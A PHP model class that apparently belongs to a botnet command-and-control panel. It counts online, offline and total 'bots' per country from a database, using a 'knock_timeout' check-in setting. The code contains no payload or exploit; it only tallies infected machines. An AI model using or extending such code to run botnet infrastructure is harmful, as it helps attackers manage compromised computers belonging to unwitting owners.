<?php

class Model_Countries extends Model
{

    public function get_data()
    {

    }

    public function getCountriesStats() {
        $outStats = array();
        $onlineAll = 0;
        $offlineAll = 0;
        $AllCount = 0;
        $knock = $this->getDB()->queryValue("SELECT setting_value FROM general_settings WHERE setting_name = 'knock_timeout'");
        $countries = $this->getDB()->queryValues('SELECT DISTINCT country FROM bots');
        foreach ($countries as $index => $country) {
            $countOnline = $this->getDB()->queryValue('SELECT COUNT(*) FROM bots WHERE country=:country AND last_login + :on > UNIX_TIMESTAMP()',
                array(':on' => $knock * 60, ':country' => $country));
            $countOffline = $this->getDB()->queryValue('SELECT COUNT(*) FROM bots WHERE country=:country AND last_login + :on < UNIX_TIMESTAMP()',
                array(':on' => $knock * 60, ':country' => $country));
            $countAll = $this->getDB()->queryValue('SELECT COUNT(*) FROM bots WHERE country=:country',
                array(':country' => $country));

            $onlineAll += $countOnline;
            $offlineAll += $countOffline;
            $AllCount += $countAll;

            $outStats[$index]['country'] = htmlspecialchars($country) . ' <img class="flag flag-'.strtolower(htmlspecialchars($country)).'">';
            $outStats[$index]['count_online'] = $countOnline;
            $outStats[$index]['count_offline'] = $countOffline;
            $outStats[$index]['count_all'] = $countAll;
        }
        uasort($outStats, array($this, 'cmp_bots_function_desc'));
        $outStats[] = array(
            'country' => '<b>All</b>',
            'count_online' => '<b>' . $onlineAll . '</b>',
            'count_offline' => '<b>' . $offlineAll . '</b>',
            'count_all' => '<b>' . $AllCount . '</b>');
        return $outStats;
    }

    private function cmp_bots_function_desc($a, $b){
        return ($a['count_all'] < $b['count_all']);
    }

}